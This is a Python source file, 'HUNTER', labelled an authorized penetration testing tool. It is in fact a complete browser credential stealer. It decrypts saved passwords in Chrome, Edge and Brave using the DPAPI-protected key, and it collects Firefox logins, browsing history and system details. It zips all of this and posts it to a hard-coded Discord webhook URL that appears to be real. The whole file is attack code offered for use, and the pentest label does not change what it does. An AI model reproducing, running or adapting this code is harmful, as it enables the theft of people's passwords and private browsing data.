#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    HUNTER - Browser Data Extraction Tool                     ║
║                     Authorized Penetration Testing Tool                      ║
║                                                                              ║
║  This script extracts browser history, passwords, and system information      ║
║  from target machines for authorized security assessments.                   ║
║                                                                              ║
║  Features:                                                                   ║
║    - Extract data from Chrome, Edge, Brave, and Firefox                      ║
║    - Decrypt saved passwords using DPAPI                                     ║
║    - Extract browser history (URLs, titles, timestamps)                      ║
║    - Gather comprehensive system information                                 ║
║    - Send all data as ZIP via Discord webhook                                ║
║                                                                              ║
║  Usage:                                                                      ║
║    Select the browser(s) you want to extract data from when prompted.        ║
║    All data will be packaged into a ZIP file and sent to your Discord        ║
║    webhook.                                                                  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import zipfile
import io
import platform
import socket
import psutil
from datetime import datetime
from subprocess import Popen, PIPE

# Import for password decryption
try:
    import win32crypt
except ImportError:
    win32crypt = None

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash import SHA256
except ImportError:
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import PBKDF2
    from Cryptodome.Hash import SHA256

try:
    import requests
except ImportError:
    requests = None

# Discord Webhook URL - REPLACE WITH YOUR WEBHOOK URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1483378838305112094/1Y-eyMHKIH_0lsSWvekzBNBR-TFlzTTgNAmhxkP2X4qVKAQOhpIeTcNB5knMLcdn5-Zo"

# Supported browsers
BROWSERS = {
    "1": "Google Chrome",
    "2": "Microsoft Edge",
    "3": "Brave Browser",
    "4": "Mozilla Firefox",
    "5": "All Browsers"
}

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print the tool banner."""
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    HUNTER - Browser Data Extraction Tool                     ║
║                     Authorized Penetration Testing Tool                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def get_chrome_key():
    """Extract the encryption key from Chrome's Local State file."""
    try:
        local_state_path = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'
        )
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error getting Chrome key: {e}")
        return None

def get_edge_key():
    """Extract the encryption key from Edge's Local State file."""
    try:
        local_state_path = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Local State'
        )
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error getting Edge key: {e}")
        return None

def get_brave_key():
    """Extract the encryption key from Brave's Local State file."""
    try:
        local_state_path = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'
        )
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error getting Brave key: {e}")
        return None

def decrypt_password(encrypted_password, key):
    """Decrypt password using AES-GCM."""
    try:
        # Remove 'v10' or 'v11' prefix
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            encrypted_password = encrypted_password[3:]
        
        # Extract IV (12 bytes) and ciphertext
        iv = encrypted_password[:12]
        ciphertext = encrypted_password[12:]
        
        # Create cipher and decrypt
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(ciphertext[:-16])  # Remove auth tag
        return decrypted.decode('utf-8')
    except Exception as e:
        return f"Decryption failed: {e}"

def extract_chrome_passwords():
    """Extract saved passwords from Chrome."""
    try:
        key = get_chrome_key()
        if not key:
            return []
        
        login_db = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'
        )
        
        temp_db = os.path.join(os.environ['TEMP'], 'chrome_login_data.db')
        shutil.copy2(login_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins"
        )
        
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password, date_created, date_last_used = row
            if encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, key)
                passwords.append({
                    'url': url,
                    'username': username,
                    'password': decrypted_password,
                    'date_created': date_created,
                    'date_last_used': date_last_used
                })
        
        conn.close()
        os.remove(temp_db)
        return passwords
    except Exception as e:
        print(f"Error extracting Chrome passwords: {e}")
        return []

def extract_edge_passwords():
    """Extract saved passwords from Edge."""
    try:
        key = get_edge_key()
        if not key:
            return []
        
        login_db = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'
        )
        
        temp_db = os.path.join(os.environ['TEMP'], 'edge_login_data.db')
        shutil.copy2(login_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins"
        )
        
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password, date_created, date_last_used = row
            if encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, key)
                passwords.append({
                    'url': url,
                    'username': username,
                    'password': decrypted_password,
                    'date_created': date_created,
                    'date_last_used': date_last_used
                })
        
        conn.close()
        os.remove(temp_db)
        return passwords
    except Exception as e:
        print(f"Error extracting Edge passwords: {e}")
        return []

def extract_brave_passwords():
    """Extract saved passwords from Brave."""
    try:
        key = get_brave_key()
        if not key:
            return []
        
        login_db = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'
        )
        
        temp_db = os.path.join(os.environ['TEMP'], 'brave_login_data.db')
        shutil.copy2(login_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins"
        )
        
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password, date_created, date_last_used = row
            if encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, key)
                passwords.append({
                    'url': url,
                    'username': username,
                    'password': decrypted_password,
                    'date_created': date_created,
                    'date_last_used': date_last_used
                })
        
        conn.close()
        os.remove(temp_db)
        return passwords
    except Exception as e:
        print(f"Error extracting Brave passwords: {e}")
        return []

def extract_firefox_passwords():
    """Extract saved passwords from Firefox."""
    passwords = []
    try:
        # Find Firefox profiles
        firefox_path = os.path.join(
            os.environ['APPDATA'],
            'Mozilla', 'Firefox', 'Profiles'
        )
        
        if not os.path.exists(firefox_path):
            return passwords
        
        for profile in os.listdir(firefox_path):
            profile_path = os.path.join(firefox_path, profile)
            if not os.path.isdir(profile_path):
                continue
            
            # Check for key4.db and logins.json
            key_db = os.path.join(profile_path, 'key4.db')
            logins_file = os.path.join(profile_path, 'logins.json')
            
            if not (os.path.exists(key_db) and os.path.exists(logins_file)):
                continue
            
            try:
                # For Firefox, we can extract from logins.json directly if no master password
                with open(logins_file, 'r', encoding='utf-8') as f:
                    logins_data = json.load(f)
                
                for entry in logins_data.get('logins', []):
                    passwords.append({
                        'url': entry.get('hostname', ''),
                        'username': entry.get('username', ''),
                        'password': entry.get('password', ''),  # May be encrypted
                        'profile': profile
                    })
            except:
                continue
        
        return passwords
    except Exception as e:
        print(f"Error extracting Firefox passwords: {e}")
        return []

def extract_chrome_history():
    """Extract browsing history from Chrome."""
    try:
        history_db = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'
        )
        
        temp_db = os.path.join(os.environ['TEMP'], 'chrome_history.db')
        shutil.copy2(history_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC"
        )
        
        history = []
        for row in cursor.fetchall():
            url, title, visit_count, last_visit_time = row
            history.append({
                'url': url,
                'title': title,
                'visit_count': visit_count,
                'last_visit_time': last_visit_time
            })
        
        conn.close()
        os.remove(temp_db)
        return history
    except Exception as e:
        print(f"Error extracting Chrome history: {e}")
        return []

def extract_edge_history():
    """Extract browsing history from Edge."""
    try:
        history_db = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History'
        )
        
        temp_db = os.path.join(os.environ['TEMP'], 'edge_history.db')
        shutil.copy2(history_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC"
        )
        
        history = []
        for row in cursor.fetchall():
            url, title, visit_count, last_visit_time = row
            history.append({
                'url': url,
                'title': title,
                'visit_count': visit_count,
                'last_visit_time': last_visit_time
            })
        
        conn.close()
        os.remove(temp_db)
        return history
    except Exception as e:
        print(f"Error extracting Edge history: {e}")
        return []

def extract_firefox_history():
    """Extract browsing history from Firefox."""
    try:
        firefox_path = os.path.join(
            os.environ['APPDATA'],
            'Mozilla', 'Firefox', 'Profiles'
        )
        
        history = []
        if not os.path.exists(firefox_path):
            return history
        
        for profile in os.listdir(firefox_path):
            profile_path = os.path.join(firefox_path, profile)
            if not os.path.isdir(profile_path):
                continue
            
            places_db = os.path.join(profile_path, 'places.sqlite')
            if not os.path.exists(places_db):
                continue
            
            conn = sqlite3.connect(places_db)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC"
            )
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_date = row
                history.append({
                    'url': url,
                    'title': title,
                    'visit_count': visit_count,
                    'last_visit_date': last_visit_date,
                    'profile': profile
                })
            
            conn.close()
        
        return history
    except Exception as e:
        print(f"Error extracting Firefox history: {e}")
        return []

def get_system_info():
    """Collect comprehensive system information."""
    try:
        info = {
            'system': {
                'platform': platform.system(),
                'platform_version': platform.version(),
                'release': platform.release(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'machine': platform.machine(),
                'node': platform.node(),
            },
            'cpu': {
                'physical_cores': psutil.cpu_count(logical=False),
                'logical_cores': psutil.cpu_count(logical=True),
                'frequency': psutil.cpu_freq().current if psutil.cpu_freq() else 'N/A',
            },
            'memory': {
                'total': round(psutil.virtual_memory().total / (1024**3), 2),
                'available': round(psutil.virtual_memory().available / (1024**3), 2),
                'percent': psutil.virtual_memory().percent,
            },
            'disk': [],
            'network': {
                'hostname': socket.gethostname(),
                'ip_address': socket.gethostbyname(socket.gethostname()),
            },
            'users': [],
            'processes': [],
        }
        
        # Disk information
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                info['disk'].append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'fstype': partition.fstype,
                    'total': round(usage.total / (1024**3), 2),
                    'used': round(usage.used / (1024**3), 2),
                    'free': round(usage.free / (1024**3), 2),
                    'percent': usage.percent,
                })
            except:
                continue
        
        # User information
        for user in psutil.users():
            info['users'].append({
                'name': user.name,
                'terminal': user.terminal,
                'host': user.host,
                'started': datetime.fromtimestamp(user.started).strftime('%Y-%m-%d %H:%M:%S') if user.started else 'N/A',
            })
        
        # Process information (top 20 processes by CPU)
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            processes.sort(key=lambda x: x.get('cpu_percent', 0), reverse=True)
            info['processes'] = processes[:20]
        except:
            pass
        
        return info
    except Exception as e:
        print(f"Error getting system info: {e}")
        return {}

def send_to_discord(data, filename='browser_data.zip'):
    """Send data to Discord via webhook."""
    if not requests or WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
        print("Webhook URL not configured or requests library not available.")
        return False
    
    try:
        # Create ZIP file in memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for key, value in data.items():
                if key.endswith('.json'):
                    zipf.writestr(key, json.dumps(value, indent=2, ensure_ascii=False))
                elif key.endswith('.txt'):
                    zipf.writestr(key, str(value))
        
        zip_buffer.seek(0)
        
        # Send to Discord
        webhook_data = {
            'content': f'**Browser Data Extraction - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}**\n'
                      f'System: {platform.node()}\n'
                      f'IP: {socket.gethostbyname(socket.gethostname())}'
        }
        
        response = requests.post(WEBHOOK_URL, data=webhook_data, files={
            'file': (filename, zip_buffer, 'application/zip')
        })
        
        if response.status_code in [200, 204]:
            print(f"✓ Data successfully sent to Discord!")
            return True
        else:
            print(f"✗ Failed to send data. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"Error sending to Discord: {e}")
        return False

def main_menu():
    """Display the main menu and handle user selection."""
    clear_screen()
    print_banner()
    print("Select browser(s) to extract data from:\n")
    
    for key, value in BROWSERS.items():
        print(f"  [{key}] {value}")
    
    print("\n  [Q] Quit\n")
    
    choice = input("Enter your choice: ").strip()
    
    if choice.lower() == 'q':
        print("Exiting...")
        sys.exit(0)
    
    if choice not in BROWSERS:
        print("Invalid choice. Please try again.")
        input("Press Enter to continue...")
        return main_menu()
    
    return choice

def extract_data(selected_browsers):
    """Extract data based on user selection."""
    all_data = {
        'passwords': [],
        'history': [],
        'system_info': get_system_info()
    }
    
    print("\n" + "="*60)
    print("EXTRACTING DATA...")
    print("="*60)
    
    # Map browser selections to functions
    browser_map = {
        "1": ("Chrome", extract_chrome_passwords, extract_chrome_history),
        "2": ("Edge", extract_edge_passwords, extract_edge_history),
        "3": ("Brave", extract_brave_passwords, None),  # Brave history extraction might need adjustment
        "4": ("Firefox", extract_firefox_passwords, extract_firefox_history),
    }
    
    selected_list = []
    if selected_browsers == "5":  # All browsers
        selected_list = ["1", "2", "3", "4"]
    else:
        selected_list = [selected_browsers]
    
    for browser_key in selected_list:
        if browser_key in browser_map:
            name, password_func, history_func = browser_map[browser_key]
            print(f"\nProcessing {name}...")
            
            # Extract passwords
            try:
                passwords = password_func()
                all_data['passwords'].extend([{**p, 'browser': name} for p in passwords])
                print(f"  ✓ Extracted {len(passwords)} passwords")
            except Exception as e:
                print(f"  ✗ Failed to extract passwords: {e}")
            
            # Extract history
            if history_func:
                try:
                    history = history_func()
                    all_data['history'].extend([{**h, 'browser': name} for h in history])
                    print(f"  ✓ Extracted {len(history)} history entries")
                except Exception as e:
                    print(f"  ✗ Failed to extract history: {e}")
    
    return all_data

def main():
    """Main entry point."""
    try:
        choice = main_menu()
        
        # Extract data based on selection
        all_data = extract_data(choice)
        
        # Save to files
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Create data directory
        data_dir = os.path.join(os.environ['TEMP'], f'hunter_data_{timestamp}')
        os.makedirs(data_dir, exist_ok=True)
        
        # Save data as JSON
        with open(os.path.join(data_dir, 'passwords.json'), 'w', encoding='utf-8') as f:
            json.dump(all_data['passwords'], f, indent=2, ensure_ascii=False)
        
        with open(os.path.join(data_dir, 'history.json'), 'w', encoding='utf-8') as f:
            json.dump(all_data['history'], f, indent=2, ensure_ascii=False)
        
        with open(os.path.join(data_dir, 'system_info.json'), 'w', encoding='utf-8') as f:
            json.dump(all_data['system_info'], f, indent=2, ensure_ascii=False)
        
        # Create summary file
        summary = f"""
╔══════════════════════════════════════════════════════════════╗
║           HUNTER - Data Extraction Summary                   ║
║           {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                      ║
╚══════════════════════════════════════════════════════════════╝

System Information:
  Platform: {platform.system()} {platform.release()}
  Node: {platform.node()}
  IP: {socket.gethostbyname(socket.gethostname())}

Extracted Data:
  Passwords: {len(all_data['passwords'])}
  History Entries: {len(all_data['history'])}

"""
        
        with open(os.path.join(data_dir, 'summary.txt'), 'w', encoding='utf-8') as f:
            f.write(summary)
        
        print(f"\n" + "="*60)
        print(f"Data saved to: {data_dir}")
        print("="*60)
        
        # Send to Discord
        print("\nSending data to Discord...")
        if send_to_discord({
            'passwords.json': all_data['passwords'],
            'history.json': all_data['history'],
            'system_info.json': all_data['system_info'],
            'summary.txt': summary
        }):
            print("✓ Data successfully sent to Discord webhook!")
        else:
            print("✗ Failed to send data to Discord.")
        
        input("\nPress Enter to exit...")
        
    except KeyboardInterrupt:
        print("\n\nOperation cancelled by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn error occurred: {e}")
        input("Press Enter to exit...")
        sys.exit(1)

if __name__ == "__main__":
    main()